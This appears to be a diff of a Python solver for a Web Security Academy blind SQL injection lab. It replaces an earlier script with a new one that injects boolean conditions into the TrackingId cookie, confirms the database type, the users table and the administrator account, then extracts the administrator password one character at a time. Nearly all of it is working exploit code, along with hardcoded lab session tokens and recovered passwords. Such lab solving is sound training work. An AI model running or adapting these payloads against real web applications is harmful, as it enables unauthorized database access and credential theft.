@@ -1,43 +1,100 @@
-# https://gist.githubusercontent.com/fahmifj/1cc3e3e67362edb8ffcd093a1bf54189/raw/69aa0a58118058c6d39a136cbb0db0bbb463af1e/blind-sql.py
-import requests, string, sys, warnings, time
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
+#!/usr/bin/env python3
 
-warnings.simplefilter('ignore', InsecureRequestWarning)
+import requests
 
-req = requests.Session()
-url = "https://0a6400610401492b814ef27000cd0074.web-security-academy.net/filter?category=Gifts"
-hint = "Welcome back!"
+url = 'https://0af800a103b72b0d834133d800af009e.web-security-academy.net/'
 
-# Cookie: TrackingId=h2dGFtb9XTYwq4zk; session=6hkZoumrQhrU9o4i03CQxdXkDpyTiePP
-#Cookie: TrackingId=U4C6AppR7kGOstFd; session=nHnUJ2tbo31l0bUHGZSA2lE3ftDRP5Vp
-#Cookie: TrackingId=8HXcwxySckfsKq6Z; session=IRUMYWTNYDfVa7bqbHB1kxWsSe73E9vV
+"""
+TrackingId = ZKrQl8pOhmfnXfoi
+Session = 18n8HR7T9z43SqflhSKa2LaARFWfAcpT
+payload = f'''{trackingid}' AND SUBSTR(version(),1,10) = 'PostgreSQL'''
+"""
+trackingid = 'ZKrQl8pOhmfnXfoi'
+payload = f'''{trackingid}' AND SUBSTR(version(),1,10) = 'PostgreSQL'''
 
-#TrackingId=4IQa4cVqolskHiiD; session=rgNepCADsCnJlsOEltsnzx9xRVSc4fw2
-password = ""  # ag2yj74y5ng8k1uvbxni // length 21
-# kthtccl0eonf2ki7z3ew
-#ooll8jzd4dy2pmrdr7ql
-index = 1
-password_length = 20
-
-# For debugging
-proxies = {
-    'http': 'http://127.0.0.1:8080',
-    'https': 'http://127.0.0.1:8080',
+cookie = {
+    'session': '18n8HR7T9z43SqflhSKa2LaARFWfAcpT',
+    'TrackingId': payload
 }
+
+r = requests.get(url, cookies=cookie)
+
+if 'Welcome back!' in r.text:
+    print('PostgreSQL is True')
+else:
+    print('PostgreSQL is False')
+
+"""
+TrackingId = G8H2nJYh2VLEzT4X
+Session = 99OQmztUcTiLkRhlz6btyTRnxFoUZ9i5
+following line confirm there is a table called users 
+payload = f'''{trackingid}' AND (SELECT table_name FROM information_schema.tables WHERE table_name='users') = 'users'''
+
+"""
+
+payload = f'''{trackingid}' AND (SELECT table_name FROM information_schema.tables WHERE table_name='users') = 'users'''
+
+cookie = {
+    'session': '18n8HR7T9z43SqflhSKa2LaARFWfAcpT',
+    'TrackingId': payload
+}
+
+r = requests.get(url, cookies=cookie)
+
+if 'Welcome back!' in r.text:
+    print('Table name is users is True')
+else:
+    print('Table name is users is False')
+"""
+Then, we can try to confirm the administrator username:
+
+payload = f'''{trackingid}' AND (SELECT 'a' FROM users WHERE username='administrator')='a'''
+"""
+payload = f'''{trackingid}' AND (SELECT 'a' FROM users WHERE username='administrator')='a'''
+
+cookie = {
+    'session': '18n8HR7T9z43SqflhSKa2LaARFWfAcpT',
+    'TrackingId': payload
+}
+
+r = requests.get(url, cookies=cookie)
+
+if 'Welcome back!' in r.text:
+    print('user name=administrator in users is True')
+else:
+    print('user name=administrator in users is False')
+
+""" Password"""
+
+# !/usr/bin/env python3
+
+import requests
+from string import ascii_lowercase, digits
+
+chars = ascii_lowercase + digits
+position = 1
+password = ''
+
 while True:
-    if index > password_length:
-        print("\n Finished at index = ", index)
-        break
-    for char in string.ascii_letters + string.digits:  # a-z,A-Z,0-9
-        sys.stdout.write(f"\r[+] Password: {password}{char}")
-        cookies = {             #NOTICE EVERY TRIAL , WE RESET COOKIES
-            "session": "rgNepCADsCnJlsOEltsnzx9xRVSc4fw2",
-            "TrackingId": f"4IQa4cVqolskHiiD' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{index},1) = '{char}",
+    for character in chars:
+        payload = f'''{trackingid}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{character}'''
+        cookie = {
+            'session': 'vPWvc2zNez4KXQTSQWyqy6EOJLtjbdCb',
+            'TrackingId': payload
         }
-        resp = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
-        if hint in resp.text:
-            password = password + char
-            index = index + 1
-            if index > password_length:
-                print("\n Finished")
-                break
+
+        r = requests.get(url, cookies=cookie)
+
+        if 'Welcome back!' in r.text:
+            # print('True')
+            password += ''.join(character)
+            print(f'[+] Found password: {password}', end='\r')
+            position += 1
+            break
+        else:
+            # print('False')
+            pass
+
+    if len(password) >= 20:
+        print(f'[+] administrator password: {password}')
+        exit()
